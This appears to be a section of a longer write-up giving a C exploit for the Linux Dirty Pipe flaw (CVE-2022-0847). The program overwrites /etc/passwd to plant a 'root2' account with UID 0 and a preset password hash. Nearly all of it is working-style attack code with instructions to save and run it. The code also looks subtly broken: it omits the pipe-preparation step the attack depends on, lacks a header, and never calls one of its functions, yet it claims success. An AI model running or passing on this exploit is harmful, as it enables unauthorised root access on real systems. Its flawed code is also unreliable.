## 2. C Code: Exploit splice()/pipe Buffer Corruption Primitive to Overwrite `/etc/passwd`

The Dirty Pipe vulnerability allows an unprivileged user to overwrite data in read-only files by exploiting a flaw in the kernel pipe buffer flags and splice implementation.

Below is a minimal exploit demonstrating data injection into `/etc/passwd` via a pipe buffer corruption.

Save as `dirtypipe_exploit.c`.

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <errno.h>
#include <poll.h>
#include <time.h>
#include <sys/syscall.h>
#include <linux/version.h>
#include <assert.h>

// Dirty Pipe exploit for CVE-2022-0847
// Key idea: splice data from target file into a pipe, then write new data into pipe buffers,
// which corrupts the page cache and consequently overwrites the target file content.

// Page size for offset calculations
#define PAGE_SIZE 4096
#define PIPE_BUF_SIZE 65536 // We'll increase pipe buffer size for performance

// Function to set pipe buffer size (F_SETPIPE_SZ)
static int set_pipe_size(int pipe_fd, int size) {
    int res = fcntl(pipe_fd, F_SETPIPE_SZ, size);
    if (res == -1) {
        perror("fcntl(F_SETPIPE_SZ)");
    }
    return res;
}

// Sleep helper for nanosleep timing control
static void ns_sleep(long ns) {
    struct timespec ts = {0, ns};
    nanosleep(&ts, NULL);
}

// Check kernel version compatibility
void check_kernel_version() {
    struct utsname u;
    uname(&u);
    printf("[*] Running kernel: %s\n", u.release);
    // Dirty Pipe is fixed in 5.10.102, 5.15.25, 5.16 and newer
    // We assume kernel < 5.10.102 for this exploit
}

// Exploit function overwriting target file at given offset with payload
int dirty_pipe_overwrite(const char *target_file, off_t offset, const char *data, size_t data_len) {
    int fd = open(target_file, O_RDONLY);
    if (fd == -1) {
        perror("open target_file");
        return -1;
    }

    // Create pipe
    int pipefd[2];
    if (pipe(pipefd) == -1) {
        perror("pipe");
        close(fd);
        return -1;
    }

    // Increase pipe buffer size to avoid short splices
    if (set_pipe_size(pipefd[1], PIPE_BUF_SIZE) == -1) {
        close(fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    // Offset must not be page aligned (for Dirty Pipe)
    if ((offset & (PAGE_SIZE - 1)) == 0) {
        fprintf(stderr, "Offset must not be page aligned\n");
        close(fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    // Splice 1 byte from target file at offset-1 into pipe
    // -1 offset so that the pipe buffer covers the page containing offset
    loff_t splice_offset = offset - 1;

    ssize_t nbytes = splice(fd, &splice_offset, pipefd[1], NULL, 1, 0);
    if (nbytes != 1) {
        perror("splice");
        close(fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    // Now write the data to pipefd[1]
    // This corrupts the page cache of target file at offset
    ssize_t written = write(pipefd[1], data, data_len);
    if (written != (ssize_t)data_len) {
        perror("write to pipe");
        close(fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    printf("[+] Overwrote %zu bytes at offset %lld in %s\n", data_len, (long long)offset, target_file);

    close(fd);
    close(pipefd[0]);
    close(pipefd[1]);
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s offset\n", argv[0]);
        fprintf(stderr, "This exploit overwrites /etc/passwd at given offset.\n");
        return 1;
    }

    off_t offset = atoll(argv[1]);

    // Payload: new passwd entry for root2 user
    // Format: root2:U6aMy0wojraho:0:0::/root:/bin/bash
    // Must overwrite exact bytes at offset in /etc/passwd
    const char *payload = "root2:U6aMy0wojraho:0:0::/root:/bin/bash\n";

    printf("[*] Dirty Pipe exploit started\n");

    if (dirty_pipe_overwrite("/etc/passwd", offset, payload, strlen(payload)) == 0) {
        printf("[+] Exploit succeeded, check /etc/passwd\n");
    } else {
        printf("[-] Exploit failed\n");
    }

    return 0;
}
```

